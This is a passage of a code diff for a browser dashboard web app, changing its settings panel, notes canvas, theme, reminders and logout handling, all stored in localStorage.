-                this.logAlert("Dashboard functionality loaded. Welcome to Private System v2.0!"); // Initial dashboard load alert
+                // Call default panel on load, based on settings
+                const defaultPanelId = localStorage.getItem('defaultPanelOnLoad');
+                if (defaultPanelId && defaultPanelId !== 'none') {
+                    // Slight delay to allow UI to fully render before showing panel
+                    setTimeout(() => {
+                        this.togglePanel(defaultPanelId);
+                    }, 500); 
+                }
 
-                // NEW: Attach listener for the Activity Log button
+                this.logAlert("Dashboard functionality loaded. Welcome to Private System v2.0!");
+
+                // Attach listener for the Activity Log button
                 document.getElementById('activityLogBtn').addEventListener('click', () => {
                     dashboard.showActivityLogModal();
-                    dashboard.displayActionMessage("📜 Activity Log opened.");
+                    dashboard.logAlert("📜 Activity Log opened.");
                 });
             },
             
-            // --- Session Timer (with stats integration) ---
+            // --- Session Timer (retained) ---
             initSessionTimer: function() {
               let sessionSeconds = parseInt(localStorage.getItem('stats_sessionUptimeSeconds') || '0'); 
               
@@ -1461,9 +1885,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                   const formattedTime = `${hrs}:${mins}:${secs}`;
                   
                   document.getElementById('sessionTime').innerText = `Session Time: ${formattedTime}`;
-                  this.stats.sessionUptime = formattedTime; // Store formatted uptime
-                  localStorage.setItem('stats_sessionUptimeSeconds', sessionSeconds.toString()); // Persist seconds
-                  this.updateStatsDisplay(); // Update stat panel with latest uptime
+                  this.stats.sessionUptime = formattedTime;
+                  localStorage.setItem('stats_sessionUptimeSeconds', sessionSeconds.toString());
+                  this.updateStatsDisplay();
               }, 1000);
             },
 
@@ -1477,9 +1901,15 @@ To view all available shortcuts for the specific app you are using, press and ho
                 setInterval(updateClock, 1000);
             },
             
-            // --- Calendar ---
+            // --- Calendar (retained, fixed emoji in HTML) ---
             generateCalendar: function() {
                 const calendar = document.getElementById('calendar');
+                // Ensure calendar visibility from settings
+                if (localStorage.getItem('enableCalendarDisplay') === 'false') {
+                    calendar.closest('.box').style.display = 'none';
+                } else {
+                    calendar.closest('.box').style.display = 'flex';
+                }
                 calendar.innerHTML = '';
                 const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
                 days.forEach(day => {
@@ -1499,7 +1929,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 }
             },
 
-            // --- Theme Toggle ---
+            // --- Theme Toggle (retained, adapted to new alert system) ---
             initThemeToggle: function() {
                 const themeBtn = document.getElementById('themeToggle');
                 themeBtn.addEventListener('click', () => {
@@ -1509,25 +1939,23 @@ To view all available shortcuts for the specific app you are using, press and ho
                     const themeSelector = document.getElementById('themeSelector');
                     if (themeSelector) themeSelector.value = isLightTheme ? 'light' : 'dark';
                     
-                    this.applyCustomStyles(); // Re-apply theme-dependent styles and accent colors
+                    this.applyCustomStyles();
                     this.logAlert(`🎨 Theme toggled to ${isLightTheme ? 'Light' : 'Dark'}.`);
 
                     this.stats.themeToggles++;
-                    localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString()); // Persist
+                    localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString());
                     this.updateStatsDisplay();
                 });
 
-                // Apply saved theme on load (now ensures correct classes are applied before any custom style init)
                 const savedTheme = localStorage.getItem('theme');
                 if (savedTheme === 'light') {
                     document.body.classList.add('light-theme');
                 } else {
-                    document.body.classList.remove('light-theme'); // Ensure dark theme is default if not explicitly light
+                    document.body.classList.remove('light-theme');
                 }
-                // this.applyCustomStyles() is called by init in correct sequence
             },
 
-            // --- Quickbar & Main Buttons (re-verified logic and adapted for new alert system) ---
+            // --- Quickbar & Main Buttons (retained logic, adapted for new alert system) ---
             initButtons: function() {
                 document.getElementById('panicBtn').addEventListener('click', () => {
                     window.open('https://clever.com', '_blank');
@@ -1535,9 +1963,11 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
 
                 document.getElementById('restartBtn').addEventListener('click', () => {
-                    if(confirm('Are you sure you want to terminate and restart the system?')) {
-                        document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#ff914d; font-family:'Montserrat', sans-serif; font-size:24px;">System terminated. Refresh page to restart.</div>`;
+                    const confirmLogout = localStorage.getItem('confirmLogout') !== 'false';
+                    if (confirmLogout && !confirm('Are you sure you want to terminate and restart the system?')) {
+                        return; // Abort if user cancels
                     }
+                    document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#ff914d; font-family:'Montserrat', sans-serif; font-size:24px;">System terminated. Refresh page to restart.</div>`;
                     this.logAlert('🔄 System Restart initiated.');
                 });
 
@@ -1557,34 +1987,36 @@ To view all available shortcuts for the specific app you are using, press and ho
                     }
                 });
 
-                let zoomLevel = parseFloat(document.body.style.zoom || 1); // Get initial zoom level
+                let zoomLevel = parseFloat(document.body.style.zoom || 1);
                 document.getElementById('zoomInBtn').addEventListener('click', () => {
-                    zoomLevel = Math.min(2.0, zoomLevel + 0.1); // Max zoom 200%
+                    zoomLevel = Math.min(2.0, zoomLevel + 0.1);
                     document.body.style.zoom = zoomLevel;
                     this.logAlert(`➕ Zoom In (${Math.round(zoomLevel * 100)}%)`);
-                    this.updateStatsDisplay(); // Update zoom level stat
+                    this.updateStatsDisplay();
                 });
                 document.getElementById('zoomOutBtn').addEventListener('click', () => {
-                    zoomLevel = Math.max(0.5, zoomLevel - 0.1); // Min zoom 50%
+                    zoomLevel = Math.max(0.5, zoomLevel - 0.1);
                     document.body.style.zoom = zoomLevel;
                     this.logAlert(`➖ Zoom Out (${Math.round(zoomLevel * 100)}%)`);
-                    this.updateStatsDisplay(); // Update zoom level stat
+                    this.updateStatsDisplay();
                 });
-                
-                // Initialize zoom level for stats display
                 if(document.getElementById('statsZoom')) {
                     document.getElementById('statsZoom').innerText = `${Math.round(zoomLevel * 100)}%`;
                 }
 
                 document.getElementById('logoutBtn').addEventListener('click', () => {
-                    if (confirm('Are you sure you want to log out?')) {
-                        location.reload();
+                    const confirmLogout = localStorage.getItem('confirmLogout') !== 'false';
+                    if (confirmLogout && !confirm('Are you sure you want to log out?')) {
+                        return; // Abort if user cancels
                     }
+                    localStorage.clear();
+                    sessionStorage.clear();
+                    location.reload();
                     this.logAlert('👋 User logged out.');
                 });
 
                 document.getElementById('settingsBtn').addEventListener('click', () => {
-                    this.togglePanel('settingsPanel'); // Settings is a real panel, not in quickbar by spec.
+                    this.togglePanel('settingsPanel');
                     this.logAlert('🛠️ Settings panel accessed.');
                 });
                 
@@ -1595,14 +2027,14 @@ To view all available shortcuts for the specific app you are using, press and ho
                         link.href = canvas.toDataURL();
                         link.click();
                         this.stats.screenshotsTaken++;
-                        localStorage.setItem('stats_screenshots', this.stats.screenshotsTaken.toString()); // Persist
+                        localStorage.setItem('stats_screenshots', this.stats.screenshotsTaken.toString());
                         this.updateStatsDisplay();
                         this.logAlert('📸 Screenshot taken!');
                     });
                 });
             },
 
-            // --- Notes Canvas ---
+            // --- Notes Canvas (retained logic) ---
             initCanvas: function() {
                 const notesBtn = document.getElementById('notesBtn');
                 const canvasContainer = document.getElementById('canvasContainer');
@@ -1610,48 +2042,38 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const panelButtonGrid = document.getElementById('panelButtonGrid');
                 const updatesNotifications = document.getElementById('updatesNotifications');
 
-
                 notesBtn.addEventListener('click', () => {
-                    // Hide other main dashboard content to show canvas
                     mainGrid.style.display = 'none';
                     panelButtonGrid.style.display = 'none';
-                    updatesNotifications.style.display = 'none'; // Ensure this section also hides
-
+                    updatesNotifications.style.display = 'none';
                     canvasContainer.style.display = 'block';
                     this.logAlert('📝 Notes canvas opened.');
 
-                    // Stat for canvas interaction (each open considered an "interaction use")
                     this.stats.canvasSaves++;
-                    localStorage.setItem('stats_canvas_used', this.stats.canvasSaves.toString()); // Persist
+                    localStorage.setItem('stats_canvas_used', this.stats.canvasSaves.toString());
                     this.updateStatsDisplay();
                 });
 
                 document.getElementById('closeCanvasBtn').addEventListener('click', () => {
                     canvasContainer.style.display = 'none';
-                    // Restore other main content visibility
                     mainGrid.style.display = 'flex';
-                    panelButtonGrid.style.display = 'grid'; // Ensure it returns to grid
-                    updatesNotifications.style.display = 'flex'; // Ensure this section also shows
-
+                    panelButtonGrid.style.display = 'grid';
+                    updatesNotifications.style.display = 'flex';
                     this.logAlert('📝 Notes canvas closed.');
                 });
 
                 const canvas = document.getElementById('notesCanvas');
                 const ctx = canvas.getContext('2d');
                 
-                // Set default white background for canvas if not already
                 if (!localStorage.getItem('notesCanvasData')) {
                     ctx.fillStyle = '#fff';
                     ctx.fillRect(0, 0, canvas.width, canvas.height);
                 }
 
-                // Load saved notes from localStorage
                 const savedNotes = localStorage.getItem('notesCanvasData');
                 if (savedNotes) {
                     const img = new Image();
-                    img.onload = () => {
-                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                    };
+                    img.onload = () => { ctx.drawImage(img, 0, 0, canvas.width, canvas.height); };
                     img.src = savedNotes;
                 } else {
                     ctx.fillStyle = '#fff';
@@ -1662,10 +2084,8 @@ To view all available shortcuts for the specific app you are using, press and ho
 
                 function getPos(evt) {
                     const rect = canvas.getBoundingClientRect();
-                    return {
-                        x: (evt.clientX || (evt.touches && evt.touches[0].clientX)) - rect.left,
-                        y: (evt.clientY || (evt.touches && evt.touches[0].clientY)) - rect.top
-                    };
+                    return { x: (evt.clientX || (evt.touches && evt.touches[0].clientX)) - rect.left,
+                             y: (evt.clientY || (evt.touches && evt.touches[0].clientY)) - rect.top };
                 }
 
                 ['mousedown', 'touchstart'].forEach(evtName => {
@@ -1695,7 +2115,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
                     canvas.addEventListener(evtName, () => {
                         drawing = false;
-                        localStorage.setItem('notesCanvasData', canvas.toDataURL()); // Save upon interaction ending
+                        localStorage.setItem('notesCanvasData', canvas.toDataURL());
                     });
                 });
 
@@ -1715,28 +2135,25 @@ To view all available shortcuts for the specific app you are using, press and ho
                     this.logAlert('💾 Notes exported as image.');
                 });
                 
-                // Toggle sections functionality for main dashboard content
                 document.getElementById('toggleSectionsBtn').addEventListener('click', () => {
                     const mainRowDisplay = mainGrid.style.display;
                     const panelGridDisplay = panelButtonGrid.style.display;
 
-                    // Determine current state: If they are not visible, show them. Otherwise hide.
                     const isContentVisible = (mainRowDisplay !== 'none' && mainRowDisplay !== '') ||
                                              (panelGridDisplay !== 'none' && panelGridDisplay !== '');
 
-                    if (!isContentVisible) { // If currently hidden, show them
+                    if (!isContentVisible) {
                         mainGrid.style.display = 'flex';
                         panelButtonGrid.style.display = 'grid';
                         updatesNotifications.style.display = 'flex'; 
                         this.logAlert('↔️ Dashboard sections revealed.');
-                    } else { // If currently visible, hide them
+                    } else {
                         mainGrid.style.display = 'none';
                         panelButtonGrid.style.display = 'none';
                         updatesNotifications.style.display = 'none'; 
                         this.logAlert('↔️ Dashboard sections hidden.');
                     }
                     
-                    // Always hide notes canvas and any active info panel to maintain single focus area
                     canvasContainer.style.display = 'none'; 
                     if (this.activePanel) {
                         const panelName = this.activePanel.querySelector('h2').innerText.trim();
@@ -1747,9 +2164,8 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             },
 
-            // --- Panel Management (re-verified) ---
+            // --- Panel Management (retained) ---
             initPanels: function() {
-                // Ensure all info panels are hidden by default initially
                 document.querySelectorAll('.info-panel').forEach(panel => {
                     panel.style.display = 'none';
                 });
@@ -1767,7 +2183,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const panelTitleElement = panel.querySelector('h2');
                 const panelName = panelTitleElement ? panelTitleElement.innerText.trim() : panelId;
 
-                // Close currently active panel if different from current
                 if(this.activePanel && this.activePanel.id !== panelId) {
                     this.activePanel.style.display = 'none';
                     const activePanelTitle = this.activePanel.querySelector('h2').innerText.trim();
@@ -1775,7 +2190,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                     this.activePanel = null;
                 }
 
-                // Toggle the requested panel's visibility
                 if (!isActive) {
                     panel.style.display = 'block';
                     this.activePanel = panel;
@@ -1831,7 +2245,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             },
 
-            // --- Reminders System (re-verified) ---
+            // --- Reminders System (retained) ---
             reminders: [],
             initReminders: function() {
                 const addReminderBtn = document.getElementById('addReminderBtn');
@@ -1841,7 +2255,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const remindersList = document.getElementById('remindersList');
                 const clearAllRemindersBtn = document.getElementById('clearAllRemindersBtn');
 
-                // Load reminders from LocalStorage
                 this.loadReminders();
                 this.renderReminders();
 
@@ -1965,113 +2378,223 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             },
 
-            // --- Settings Panel Functions (adapted for new alert system and removals) ---
+            // --- Settings Panel Functions (Expanded with new options) ---
             initSettings: function() {
-                const themeSelector = document.getElementById('themeSelector');
-                if (themeSelector) themeSelector.value = localStorage.getItem('theme') || 'dark';
+                // Initial load from localStorage / default values
+                const settingsElements = {
+                    themeSelector: document.getElementById('themeSelector'),
+                    uiAnimationSpeed: document.getElementById('uiAnimationSpeed'),
+                    uiAnimationSpeedValue: document.getElementById('uiAnimationSpeedValue'),
+                    enableFancyAnimations: document.getElementById('enableFancyAnimations'),
+                    consoleLoggingLevel: document.getElementById('consoleLoggingLevel'),
+                    confirmLogout: document.getElementById('confirmLogout'),
+                    defaultPanelOnLoad: document.getElementById('defaultPanelOnLoad'),
+                    enableCalendarDisplay: document.getElementById('enableCalendarDisplay'),
+                    enableUpdatesNotifications: document.getElementById('enableUpdatesNotifications'),
+                    enableMotivationQuote: document.getElementById('enableMotivationQuote'),
+                    globalFontSizeScale: document.getElementById('globalFontSizeScale'),
+                    globalFontSizeScaleValue: document.getElementById('globalFontSizeScaleValue'),
+                    mainFontFamily: document.getElementById('mainFontFamily'),
+                    buttonBorderRadius: document.getElementById('buttonBorderRadius'),
+                    buttonBorderRadiusValue: document.getElementById('buttonBorderRadiusValue'),
+                    notificationDisplayDuration: document.getElementById('notificationDisplayDuration'),
+                    notificationDisplayDurationValue: document.getElementById('notificationDisplayDurationValue'),
+                    desktopNotifications: document.getElementById('desktopNotifications'),
+                    reminderSound: document.getElementById('reminderSound'),
+                    activityLogRetention: document.getElementById('activityLogRetention'),
+                    activityLogRetentionValue: document.getElementById('activityLogRetentionValue'),
+                    accentColorPicker: document.getElementById('accentColorPicker'),
+                    mainBgColorPicker: document.getElementById('mainBgColorPicker'),
+                    headerBgColorPicker: document.getElementById('headerBgColorPicker'),
+                    buttonGlowIntensity: document.getElementById('buttonGlowIntensity'),
+                    buttonGlowIntensityValue: document.getElementById('buttonGlowIntensityValue'),
+                    scrollbarStyle: document.getElementById('scrollbarStyle'),
+                    enableLogging: document.getElementById('enableLogging')
+                };
 
-                const announcementScrollSpeed = document.getElementById('announcementScrollSpeed');
-                if (announcementScrollSpeed) {
-                    announcementScrollSpeed.value = localStorage.getItem('announcementScrollSpeed') || '20';
-                    document.getElementById('announcementScrollSpeedValue').textContent = announcementScrollSpeed.value + 's';
+                for (const key in settingsElements) {
+                    if (!settingsElements[key] || key.endsWith("Value")) continue; // Skip if element not found or is just a display span
+                    const storedValue = localStorage.getItem(key);
+                    
+                    if (settingsElements[key].type === 'checkbox') {
+                        settingsElements[key].checked = (storedValue !== null) ? (storedValue === 'true') : settingsElements[key].checked;
+                    } else if (settingsElements[key].type === 'range') {
+                        settingsElements[key].value = (storedValue !== null) ? storedValue : settingsElements[key].value;
+                        if (settingsElements[key+"Value"]) {
+                           if(key === 'globalFontSizeScale') settingsElements[key+"Value"].textContent = `${(parseFloat(settingsElements[key].value) * 100).toFixed(0)}%`;
+                           else if (key === 'buttonBorderRadius') settingsElements[key+"Value"].textContent = `${settingsElements[key].value}px`;
+                           else if (key === 'buttonGlowIntensity') settingsElements[key+"Value"].textContent = `${settingsElements[key].value}`;
+                           else if (key === 'activityLogRetention') settingsElements[key+"Value"].textContent = `${settingsElements[key].value} entries`;
+                           else settingsElements[key+"Value"].textContent = `${settingsElements[key].value}s`; // Default for speeds
+                        }
+                    } else if (settingsElements[key].tagName === 'SELECT' || settingsElements[key].type === 'color') {
+                        settingsElements[key].value = (storedValue !== null) ? storedValue : settingsElements[key].value;
+                    }
                 }
-
-                const enableMotivationQuote = document.getElementById('enableMotivationQuote');
-                if (enableMotivationQuote) {
-                    enableMotivationQuote.checked = localStorage.getItem('enableMotivationQuote') !== 'false';
-                    if (!enableMotivationQuote.checked) document.getElementById('motivationBox').style.display = 'none';
-                }
-
-                const desktopNotifications = document.getElementById('desktopNotifications');
-                if (desktopNotifications) {
-                    desktopNotifications.checked = localStorage.getItem('desktopNotifications') === 'true';
-                    if (desktopNotifications.checked && Notification.permission !== "granted") Notification.requestPermission();
-                }
-
-                const reminderSound = document.getElementById('reminderSound');
-                if (reminderSound) reminderSound.checked = localStorage.getItem('reminderSound') !== 'false';
-
-                const accentColorPicker = document.getElementById('accentColorPicker');
-                if (accentColorPicker) accentColorPicker.value = localStorage.getItem('accentColor') || '#ff914d';
                 
-                const mainBgColorPicker = document.getElementById('mainBgColorPicker');
-                if (mainBgColorPicker) mainBgColorPicker.value = localStorage.getItem('mainBgColor') || '#1a1a1a';
+                // Special check for dynamic elements like motivationBox
+                const motivationBox = document.getElementById('motivationBox');
+                if (motivationBox) {
+                    if (localStorage.getItem('enableMotivationQuote') === 'false') motivationBox.style.display = 'none';
+                    else motivationBox.style.display = 'flex';
+                }
+                 const calendarBox = document.getElementById('calendar').closest('.box');
+                if (calendarBox) {
+                    if (localStorage.getItem('enableCalendarDisplay') === 'false') calendarBox.style.display = 'none';
+                    else calendarBox.style.display = 'flex';
+                }
+                 const updatesBox = document.getElementById('updatesNotifications');
+                if (updatesBox) {
+                    if (localStorage.getItem('enableUpdatesNotifications') === 'false') updatesBox.style.display = 'none';
+                    else updatesBox.style.display = 'flex';
+                }
 
-                const headerBgColorPicker = document.getElementById('headerBgColorPicker');
-                if (headerBgColorPicker) headerBgColorPicker.value = localStorage.getItem('headerBgColor') || '#ff914d';
+                // Apply dynamic styles to actual DOM after loading all settings
+                this.applySettingsToDOM();
 
-                const enableLogging = document.getElementById('enableLogging');
-                if (enableLogging) enableLogging.checked = localStorage.getItem('enableLogging') !== 'false';
-
-                this.applySettingsToDOM(); // Re-apply existing visual settings to DOM elements.
-
-                // Event Listeners for Settings
-                if (themeSelector) themeSelector.addEventListener('change', (e) => {
+                // --- Event Listeners for new Settings ---
+                settingsElements.themeSelector?.addEventListener('change', (e) => {
                     const theme = e.target.value;
                     if (theme === 'light') document.body.classList.add('light-theme');
                     else document.body.classList.remove('light-theme');
                     localStorage.setItem('theme', theme);
                     this.applyCustomStyles();
                     this.logAlert(`Theme set to ${theme}.`);
-                    this.stats.themeToggles++;
-                    localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString());
-                    this.updateStatsDisplay();
+                    this.stats.themeToggles++; localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString()); this.updateStatsDisplay();
                 });
-                if (announcementScrollSpeed) announcementScrollSpeed.addEventListener('input', (e) => {
+                settingsElements.uiAnimationSpeed?.addEventListener('input', (e) => {
                     const speed = e.target.value;
-                    document.getElementById('announcementScrollSpeedValue').textContent = speed + 's';
-                    localStorage.setItem('announcementScrollSpeed', speed);
-                    const announcementBar = document.getElementById('announcementBar');
-                    if(announcementBar) announcementBar.style.animationDuration = speed + 's';
+                    root.style.setProperty('--ui-animation-speed', speed + 's');
+                    settingsElements.uiAnimationSpeedValue.textContent = speed + 's';
+                    localStorage.setItem('uiAnimationSpeed', speed);
                 });
-                if (enableMotivationQuote) enableMotivationQuote.addEventListener('change', (e) => {
+                settingsElements.enableFancyAnimations?.addEventListener('change', (e) => {
+                    const enabled = e.target.checked;
+                    localStorage.setItem('enableFancyAnimations', enabled);
+                    root.style.setProperty('--ui-animation-speed', enabled ? (localStorage.getItem('uiAnimationSpeed') || '0.3') + 's' : '0s');
+                    this.logAlert(`Fancy Animations ${enabled ? 'Enabled' : 'Disabled'}.`);
+                });
+                settingsElements.consoleLoggingLevel?.addEventListener('change', (e) => {
+                  const level = e.target.value;
+                  localStorage.setItem('consoleLoggingLevel', level);
+                  this.logAlert(`Console logging level set to ${level.toUpperCase()}.`);
+                });
+                settingsElements.confirmLogout?.addEventListener('change', (e) => {
+                  localStorage.setItem('confirmLogout', e.target.checked);
+                  this.logAlert(`Confirm Logout setting ${e.target.checked ? 'enabled' : 'disabled'}.`);
+                });
+                settingsElements.defaultPanelOnLoad?.addEventListener('change', (e) => {
+                  localStorage.setItem('defaultPanelOnLoad', e.target.value);
+                  this.logAlert(`Default panel on login set to "${e.target.options[e.target.selectedIndex].text}".`);
+                });
+                 settingsElements.enableCalendarDisplay?.addEventListener('change', (e) => {
+                  const visible = e.target.checked;
+                  const calendarBox = document.getElementById('calendar').closest('.box');
+                  if (calendarBox) calendarBox.style.display = visible ? 'flex' : 'none';
+                  localStorage.setItem('enableCalendarDisplay', visible);
+                  this.logAlert(`Calendar display ${visible ? 'shown' : 'hidden'}.`);
+                });
+                settingsElements.enableUpdatesNotifications?.addEventListener('change', (e) => {
+                  const visible = e.target.checked;
+                  const updatesBox = document.getElementById('updatesNotifications');
+                  if (updatesBox) updatesBox.style.display = visible ? 'flex' : 'none';
+                  localStorage.setItem('enableUpdatesNotifications', visible);
+                  this.logAlert(`Updates & Notifications display ${visible ? 'shown' : 'hidden'}.`);
+                });
+                settingsElements.enableMotivationQuote?.addEventListener('change', (e) => {
+                    const visible = e.target.checked;
                     const motivationBox = document.getElementById('motivationBox');
-                    if (motivationBox) motivationBox.style.display = e.target.checked ? 'flex' : 'none';
-                    localStorage.setItem('enableMotivationQuote', e.target.checked);
-                    this.logAlert(`Motivation quote: ${e.target.checked ? 'Shown' : 'Hidden'}.`);
+                    if (motivationBox) motivationBox.style.display = visible ? 'flex' : 'none';
+                    localStorage.setItem('enableMotivationQuote', visible);
+                    this.logAlert(`Motivational Quote display ${visible ? 'shown' : 'hidden'}.`);
                 });
-                if (reminderSound) reminderSound.addEventListener('change', (e) => {
+                settingsElements.globalFontSizeScale?.addEventListener('input', (e) => {
+                    const scale = e.target.value;
+                    root.style.setProperty('--base-font-size', `${parseFloat(scale) * 16}px`);
+                    settingsElements.globalFontSizeScaleValue.textContent = `${(parseFloat(scale) * 100).toFixed(0)}%`;
+                    localStorage.setItem('globalFontSizeScale', scale);
+                });
+                settingsElements.mainFontFamily?.addEventListener('change', (e) => {
+                    const font = e.target.value;
+                    root.style.setProperty('--font-family', font);
+                    localStorage.setItem('mainFontFamily', font);
+                    this.logAlert(`Main font family changed to ${font}.`);
+                });
+                 settingsElements.buttonBorderRadius?.addEventListener('input', (e) => {
+                    const radius = e.target.value;
+                    root.style.setProperty('--button-border-radius', radius + 'px');
+                    settingsElements.buttonBorderRadiusValue.textContent = `${radius}px`;
+                    localStorage.setItem('buttonBorderRadius', radius);
+                    this.applyCustomStyles(); // Recalculate shadows too
+                });
+                settingsElements.notificationDisplayDuration?.addEventListener('input', (e) => {
+                    const duration = e.target.value;
+                    settingsElements.notificationDisplayDurationValue.textContent = duration + 's';
+                    localStorage.setItem('notificationDisplayDuration', duration);
+                });
+                settingsElements.desktopNotifications?.addEventListener('change', (e) => {
+                    const enabled = e.target.checked;
+                    localStorage.setItem('desktopNotifications', enabled);
+                    if (enabled && Notification.permission !== "granted") Notification.requestPermission();
+                    this.logAlert(`Desktop notifications ${enabled ? 'enabled' : 'disabled'}.`);
+                });
+                settingsElements.reminderSound?.addEventListener('change', (e) => {
                     localStorage.setItem('reminderSound', e.target.checked);
-                    this.logAlert(`Reminder sound: ${e.target.checked ? 'On' : 'Off'}.`);
+                    this.logAlert(`Reminder sound ${e.target.checked ? 'on' : 'off'}.`);
                 });
-                if (desktopNotifications) desktopNotifications.addEventListener('change', (e) => {
-                    localStorage.setItem('desktopNotifications', e.target.checked);
-                    if (e.target.checked && Notification.permission !== "granted") Notification.requestPermission();
-                    this.logAlert(`Desktop notifications: ${e.target.checked ? 'Enabled' : 'Disabled'}.`);
+                 settingsElements.activityLogRetention?.addEventListener('input', (e) => {
+                    const entries = e.target.value;
+                    settingsElements.activityLogRetentionValue.textContent = `${entries} entries`;
+                    localStorage.setItem('activityLogRetention', entries);
+                    this.logAlert(`Activity Log retention set to ${entries} entries.`);
                 });
-                if (accentColorPicker) accentColorPicker.addEventListener('input', (e) => {
+                settingsElements.accentColorPicker?.addEventListener('input', (e) => {
                     localStorage.setItem('accentColor', e.target.value);
                     this.applyCustomStyles();
                     this.logAlert(`Accent color changed to ${e.target.value}.`);
                 });
-                if (mainBgColorPicker) mainBgColorPicker.addEventListener('input', (e) => {
+                settingsElements.mainBgColorPicker?.addEventListener('input', (e) => {
                     const color = e.target.value;
-                    localStorage.setItem('mainBgColor', color);
-                    document.documentElement.style.setProperty('--main-bg', color);
-                    this.logAlert(`Main background color changed to ${color}.`);
+                    localStorage.setItem('mainBgColorStart', color); // Save custom property for gradient start
+                    document.documentElement.style.setProperty('--main-bg-start', color); // Directly apply
+                    this.applyCustomStyles();
+                    this.logAlert(`Main background start color changed to ${color}.`);
                 });
-                if (headerBgColorPicker) headerBgColorPicker.addEventListener('input', (e) => {
+                settingsElements.headerBgColorPicker?.addEventListener('input', (e) => {
                     const color = e.target.value;
                     localStorage.setItem('headerBgColor', color);
-                    const dashboardHeader = document.getElementById('dashboardHeader');
-                    if(dashboardHeader) dashboardHeader.style.background = `linear-gradient(90deg, ${color}, ${this.lightenColor(color, 30)})`;
+                    this.applyCustomStyles(); // To update gradient in header
                     this.logAlert(`Header background color changed to ${color}.`);
                 });
-                if (enableLogging) enableLogging.addEventListener('change', (e) => {
+                 settingsElements.buttonGlowIntensity?.addEventListener('input', (e) => {
+                    const intensity = e.target.value;
+                    root.style.setProperty('--button-glow-intensity', intensity);
+                    settingsElements.buttonGlowIntensityValue.textContent = `${intensity}`;
+                    localStorage.setItem('buttonGlowIntensity', intensity);
+                    this.applyCustomStyles(); // To update existing shadows
+                });
+                settingsElements.scrollbarStyle?.addEventListener('change', (e) => {
+                  const custom = e.target.checked;
+                  localStorage.setItem('scrollbarStyle', custom);
+                  if (custom) document.body.classList.add('custom-scrollbar');
+                  else document.body.classList.remove('custom-scrollbar');
+                  this.logAlert(`Custom scrollbar style ${custom ? 'enabled' : 'disabled'}.`);
+                });
+                settingsElements.enableLogging?.addEventListener('change', (e) => {
                     localStorage.setItem('enableLogging', e.target.checked);
-                    this.logAlert(`Analytics logging: ${e.target.checked ? 'Enabled' : 'Disabled'}.`);
+                    this.logAlert(`Analytics logging (webhooks) ${e.target.checked ? 'Enabled' : 'Disabled'}.`);
                 });
 
-                document.getElementById('clearCacheBtn').addEventListener('click', () => {
-                    if (confirm('Are you sure you want to clear ALL local data (notes, reminders, settings, logs)? This cannot be undone.')) {
+
+                document.getElementById('clearCacheBtn')?.addEventListener('click', () => {
+                    if (confirm('Are you sure you want to clear ALL local data (settings, notes, reminders, logs)? This cannot be undone.')) {
                         localStorage.clear();
+                        dashboard.activityLogHistory = []; // Clear in-memory history too
                         this.logAlert('LocalStorage cleared. Page reloading...');
-                        // Also clear current in-memory log history
-                        dashboard.activityLogHistory = [];
                         location.reload();
                     }
                 });
-                document.getElementById('dataExportBtn').addEventListener('click', () => {
+                document.getElementById('dataExportBtn')?.addEventListener('click', () => {
                     const data = {
                         localStorage: {},
                         activityLog: dashboard.activityLogHistory
@@ -2092,44 +2615,93 @@ To view all available shortcuts for the specific app you are using, press and ho
                     URL.revokeObjectURL(url);
                     this.logAlert('📤 All user data (including activity log) exported.');
                 });
-                // Event delegation for color reset buttons within the setting groups
                 document.querySelectorAll('.settings-grid').forEach(grid => {
                     grid.addEventListener('click', (e) => {
                         if (e.target.classList.contains('action-button') && e.target.textContent === 'Reset') {
-                            // Find the color input ID related to the clicked reset button
-                            const pickerInput = e.target.closest('.color-picker').querySelector('input[type="color"]');
+                            const pickerInput = e.target.closest('.color-picker')?.querySelector('input[type="color"]');
                             if (pickerInput) this.resetColorSetting(pickerInput.id);
                         }
                     });
                 });
             },
             applySettingsToDOM: function() {
+                const root = document.documentElement;
+
+                // Theme
                 const savedTheme = localStorage.getItem('theme');
                 if (savedTheme === 'light') document.body.classList.add('light-theme');
                 else document.body.classList.remove('light-theme');
 
+                // Animation Speed
+                const uiAnimationSpeed = localStorage.getItem('uiAnimationSpeed') || '0.3';
+                root.style.setProperty('--ui-animation-speed', uiAnimationSpeed + 's');
+                if(document.getElementById('uiAnimationSpeedValue')) document.getElementById('uiAnimationSpeedValue').textContent = uiAnimationSpeed + 's';
+                if(localStorage.getItem('enableFancyAnimations') === 'false') { // Override if animations disabled
+                  root.style.setProperty('--ui-animation-speed', '0s');
+                }
+
+                // Announcement Scroll Speed
                 const scrollSpeed = localStorage.getItem('announcementScrollSpeed') || '20';
                 const announcementBar = document.getElementById('announcementBar');
                 if(announcementBar) announcementBar.style.animationDuration = scrollSpeed + 's';
-                const announcementScrollSpeedValue = document.getElementById('announcementScrollSpeedValue');
-                if(announcementScrollSpeedValue) announcementScrollSpeedValue.textContent = scrollSpeed + 's';
+                if(document.getElementById('announcementScrollSpeedValue')) document.getElementById('announcementScrollSpeedValue').textContent = scrollSpeed + 's';
 
+                // Font Family
+                const mainFontFamily = localStorage.getItem('mainFontFamily') || "'Segoe UI', sans-serif";
+                root.style.setProperty('--font-family', mainFontFamily);
+                if(document.getElementById('mainFontFamily')) document.getElementById('mainFontFamily').value = mainFontFamily;
+
+                // Font Size Scale
+                const globalFontSizeScale = localStorage.getItem('globalFontSizeScale') || '1.0';
